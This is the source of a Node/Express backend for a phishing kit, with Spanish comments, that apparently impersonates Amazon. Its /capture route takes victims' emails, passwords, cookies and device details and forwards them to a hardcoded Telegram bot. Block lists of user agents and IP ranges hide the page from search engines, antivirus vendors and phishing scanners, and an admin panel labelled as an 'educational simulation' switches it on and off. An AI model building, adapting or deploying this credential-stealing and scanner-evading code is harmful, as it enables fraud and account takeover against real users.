import express from 'express'
import cors from 'cors'

const app = express()
const PORT = 3001

const TELEGRAM_TOKEN   = '7805520464:AAEtj4JzDwU0K3p-0v8GpJJM9nUlGjK9TjY'
const TELEGRAM_CHAT_ID = '5340125265'
const ADMIN_PASS       = 'prof2026'

// Estado: true = página activa, false = redirige a Amazon
let pageActive = true

// Token secreto de URL — solo funciona en /{TOKEN}
const SECRET_TOKEN = 'AM' + Math.random().toString(36).substring(2, 10).toUpperCase() + Date.now().toString(36).substring(-4).toUpperCase()
console.log(`🔑 Token secreto: ${SECRET_TOKEN}`)

// Rate limiter — máx 5 visitas por IP
const MAX_VISITS = 5
const ipVisits = new Map()

// ══════════════════════════════════════════════
//  FILTRO ANTI-BOT: User-Agents sospechosos
// ══════════════════════════════════════════════
const BOT_KEYWORDS = [
  // Motores de búsqueda
  'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
  'yandexbot', 'sogou', 'exabot', 'facebot', 'facebookexternalhit',
  // Crawlers de seguridad y antivirus
  'virustotal', 'phishtank', 'urlscan', 'safebrowsing',
  'norton', 'avast', 'kaspersky', 'mcafee', 'bitdefender',
  'malwarebytes', 'sophos', 'eset', 'trendmicro', 'fortinet',
  'paloalto', 'crowdstrike', 'symantec',
  // Otros bots / herramientas
  'curl', 'wget', 'python-requests', 'scrapy', 'httpclient',
  'java/', 'libwww', 'lwp-', 'go-http-client', 'node-fetch',
  'postman', 'insomnia', 'burp', 'nikto', 'nmap', 'masscan',
  'zgrab', 'censys', 'shodan', 'headlesschrome', 'phantomjs',
  'selenium', 'puppeteer', 'playwright',
]

// ══════════════════════════════════════════════
//  FILTRO ANTI-BOT: Rangos de IP conocidos
//  (prefijos de IPs de Google, Microsoft, etc.)
// ══════════════════════════════════════════════
const BLOCKED_IP_PREFIXES = [
  // Google (crawlers & cloud)
  '66.249.', '64.233.', '72.14.', '74.125.', '209.85.', '216.239.',
  '66.102.', '108.177.', '142.250.', '172.217.', '173.194.',
  '35.190.', '35.191.', '35.192.', '35.193.', '35.194.',
  '35.199.', '35.200.', '35.201.', '35.202.', '35.203.',
  // Microsoft / Bing
  '40.77.', '157.55.', '157.56.', '199.30.', '207.46.', '65.55.',
  '131.253.', '20.', '52.', '13.64.', '13.65.', '13.66.', '13.67.',
  '104.40.', '104.41.', '104.42.', '104.43.',
  // Amazon AWS (scanners)
  '54.', '52.', '18.',
  // VirusTotal / Security vendors
  '185.141.', '185.220.', '185.56.',
  // Cloudflare (workers/bots)
  '104.16.', '104.17.', '104.18.', '104.19.', '104.20.',
  '104.21.', '104.22.', '104.23.', '104.24.', '104.25.',
  '172.64.', '172.65.', '172.66.', '172.67.',
  // Tor exit nodes (comunes)
  '185.220.', '198.96.', '176.10.', '62.210.',
]

function isBot(userAgent, ip) {
  // Verificar User-Agent
  if (userAgent) {
    const ua = userAgent.toLowerCase()
    for (const keyword of BOT_KEYWORDS) {
      if (ua.includes(keyword)) return true
    }
  }

  // Verificar IP
  if (ip) {
    for (const prefix of BLOCKED_IP_PREFIXES) {
      if (ip.startsWith(prefix)) return true
    }
  }

  // Si no tiene User-Agent es sospechoso
  if (!userAgent || userAgent.length < 20) return true

  return false
}

function getVisitorIP(req) {
  return (
    req.headers['cf-connecting-ip'] ||
    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
    req.socket.remoteAddress ||
    ''
  ).replace('::ffff:', '')
}

async function sendTelegram(data) {
  const { email, password, ip, userAgent, cookies, screenRes, language, timestamp } = data
  const text =
    `🎣 *Nueva captura*\n` +
    `📧 *Email:* \`${email}\`\n` +
    `🔑 *Password:* \`${password}\`\n` +
    `🌐 *IP:* \`${ip}\`\n` +
    `🖥️ *Pantalla:* ${screenRes}  |  🌍 *Idioma:* ${language}\n` +
    `🍪 *Cookies:* \`${cookies}\`\n` +
    `🔍 *User-Agent:* \`${userAgent}\`\n` +
    `🕐 ${timestamp}`

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' })
    })
    console.log('📨 Enviado a Telegram')
  } catch (err) {
    console.error('❌ Error Telegram:', err.message)
  }
}

app.use(cors())
app.use(express.json())
app.use(express.urlencoded({ extended: true }))

// ── Estado: el frontend consulta esto ──
app.get('/status', (req, res) => {
  const ip = getVisitorIP(req)
  const ua = req.headers['user-agent'] || ''
  const path = req.query.path || ''

  // Si es bot → siempre decir "apagada"
  if (isBot(ua, ip)) {
    console.log(`🤖 Bot detectado → ${ua.substring(0, 50)}... | IP: ${ip}`)
    return res.json({ active: false })
  }

  // Si la ruta no coincide con el token → apagada
  if (path !== SECRET_TOKEN) {
    return res.json({ active: false })
  }

  // Segunda capa: verificar que el User-Agent es de móvil real
  const uaLower = ua.toLowerCase()
  const isMobile = /iphone|ipad|ipod|android|mobile|phone|webos|blackberry|opera mini|iemobile/.test(uaLower)
  if (!isMobile) {
    console.log(`🖥️ PC detectada (server-side) → ${ua.substring(0, 60)}`)
    return res.json({ active: false })
  }

  // Rate limit: máximo 5 visitas por IP
  const count = (ipVisits.get(ip) || 0) + 1
  ipVisits.set(ip, count)
  if (count > MAX_VISITS) {
    console.log(`🚫 IP bloqueada (${count} visitas) → ${ip}`)
    return res.json({ active: false })
  }

  res.json({ active: pageActive })
})

// ── Panel de admin ──
app.get('/x7k9p2', (req, res) => {
  const status = pageActive ? '🟢 ACTIVA' : '🔴 APAGADA'
  const toggleLabel = pageActive ? 'APAGAR' : 'ENCENDER'
  const toggleColor = pageActive ? '#d32f2f' : '#2e7d32'

  res.send(`<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Admin Panel</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:system-ui,sans-serif;background:#1a1a2e;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
  .panel{background:#16213e;border-radius:12px;padding:32px;width:360px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.4)}
  h1{font-size:20px;margin-bottom:8px}
  .status{font-size:28px;margin:20px 0;padding:12px;border-radius:8px;background:#0f3460}
  .btn{width:100%;padding:14px;border:none;border-radius:8px;font-size:16px;font-weight:700;color:#fff;cursor:pointer;margin-top:12px}
  .btn:hover{opacity:.9}
  input{width:100%;padding:10px;border-radius:6px;border:1px solid #555;background:#1a1a2e;color:#fff;font-size:14px;margin-top:12px;text-align:center}
  .info{font-size:12px;color:#888;margin-top:16px;line-height:1.5}
  .shield{font-size:11px;color:#4fc3f7;margin-top:12px;padding:10px;background:rgba(79,195,247,.1);border-radius:6px}
  .token{font-size:12px;color:#81c784;margin-top:12px;padding:10px;background:rgba(129,199,132,.1);border-radius:6px;word-break:break-all}
  .token b{color:#a5d6a7}
</style></head><body>
<div class="panel">
  <h1>🎣 Panel de Control</h1>
  <p style="color:#888">Simulación de Phishing Educativo</p>
  <div class="status">${status}</div>
  <div class="token">🔑 <b>Link secreto:</b><br>/${SECRET_TOKEN}</div>
  <form method="POST" action="/x7k9p2/toggle">
    <input type="password" name="pass" placeholder="Contraseña de admin" required>
    <button type="submit" class="btn" style="background:${toggleColor}">${toggleLabel} PÁGINA</button>
  </form>
  <div class="shield">🛡️ Filtro anti-bot ACTIVO<br>Bots de Google, Microsoft, antivirus y scanners son bloqueados automáticamente</div>
  <p class="info">Solo funciona en la ruta secreta. Cualquier otra ruta → Amazon.com</p>
</div>
</body></html>`)
})

// ── Toggle on/off ──
app.post('/x7k9p2/toggle', (req, res) => {
  if (req.body.pass !== ADMIN_PASS) {
    return res.status(401).send(`<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:system-ui;background:#1a1a2e;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.box{background:#16213e;padding:32px;border-radius:12px;text-align:center}
a{color:#4fc3f7;margin-top:12px;display:block}</style></head><body>
<div class="box"><h2>❌ Contraseña incorrecta</h2><a href="/x7k9p2">Volver</a></div></body></html>`)
  }

  pageActive = !pageActive
  const estado = pageActive ? '🟢 ENCENDIDA' : '🔴 APAGADA'
  console.log(`⚡ Página ${estado}`)
  res.redirect('/x7k9p2')
})

// ── Captura ──
app.post('/capture', (req, res) => {
  if (!pageActive) return res.json({ ok: false, redirect: true })

  const { uid, tk, n: clientIp, ua: userAgent, ck: cookies, sr: screenRes, lg: language } = req.body
  if (!uid && !tk) return res.status(400).json({ error: 'No data' })

  const ip =
    clientIp ||
    req.headers['cf-connecting-ip'] ||
    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
    req.socket.remoteAddress ||
    'desconocida'

  const timestamp = new Date().toLocaleString('es-ES', { timeZone: 'America/Bogota' })

  console.log(`✅ Capturado → ${uid} | ${ip}`)
  res.json({ ok: true })

  sendTelegram({ email: uid, password: tk, ip, userAgent, cookies, screenRes, language, timestamp })
})

app.listen(PORT, () => {
  console.log(`🎣 Servidor en http://localhost:${PORT}`)
  console.log(`🔧 Panel admin: http://localhost:${PORT}/x7k9p2`)
  console.log(`🛡️ Filtro anti-bot: ACTIVO`)
  console.log(`📨 Telegram → chat ID: ${TELEGRAM_CHAT_ID}`)
})
